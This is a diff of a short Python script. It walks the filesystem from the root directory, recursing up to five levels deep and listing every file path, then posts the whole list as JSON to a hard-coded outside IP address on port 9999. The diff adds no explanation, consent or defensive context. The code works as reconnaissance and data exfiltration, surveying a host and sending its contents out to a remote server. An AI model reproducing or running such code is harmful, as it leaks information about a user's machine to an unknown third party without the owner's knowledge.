@@ -4,11 +4,26 @@ import json
 import os
 
 res = []
-for root, dirs, files in os.walk("/", topdown=False):
-    for name in files:
-        res.append(os.path.join(root,name)+'\n')
-    for name in dirs:
-        res.append(os.path.join(root,name)+'\n')
+
+
+def gci(filepath, depth):
+    if depth > 5:
+        return
+    files = os.listdir(filepath)
+    for fi in files:
+        fi_d = os.path.join(filepath,fi)            
+        if os.path.isdir(fi_d):
+            gci(fi_d, depth+1)                  
+        else:
+            res.append(os.path.join(filepath,fi_d))
+
+gci('/', 0)
+
+# for root, dirs, files in os.walk("/", topdown=False):
+#     for name in files:
+#         res.append(os.path.join(root,name)+'\n')
+#     for name in dirs:
+#         res.append(os.path.join(root,name)+'\n')
 res_json = json.dumps({'res':res})
 response = requests.post('http://47.236.14.202:9999/report', res_json)
 
